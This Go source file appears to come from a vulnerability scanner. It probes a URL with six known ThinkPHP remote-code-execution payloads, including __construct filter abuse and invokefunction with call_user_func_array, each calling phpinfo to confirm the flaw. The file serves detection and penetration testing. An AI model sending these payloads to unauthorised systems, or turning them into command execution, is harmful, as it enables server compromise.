package ThinkPHP

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"strings"
)

func RCE(u string, client *httpx.Client) bool {
	if req, err := client.Request(u+"/index.php?s=captcha", "POST", "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=1", nil, "Poc ThinkPHP"); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true
		}
	}
	if req, err := client.Request(u+"/index.php?s=captcha", "POST", "_method=__construct&method=GET&filter[]=phpinfo&get[]=1", nil, "Poc ThinkPHP"); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true
		}
	}
	if req, err := client.Request(u+"/index.php?s=captcha", "POST", "s=1&_method=__construct&method&filter[]=phpinfo", nil, "Poc ThinkPHP"); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true
		}
	}
	if req, err := client.Request(u+"/index.php?s=index/\\think\\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1", "GET", "", nil, "Poc ThinkPHP"); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true
		}
	}
	if req, err := client.Request(u+"/index.php?s=index/think\\request/input?data[]=1&filter=phpinfo", "GET", "", nil, "Poc ThinkPHP"); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true
		}
	}
	if req, err := client.Request(u+"/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1", "GET", "", nil, "Poc ThinkPHP"); err == nil {
		if strings.Contains(req.Body, "PHP Version") {
			return true
		}
	}
	return false
}
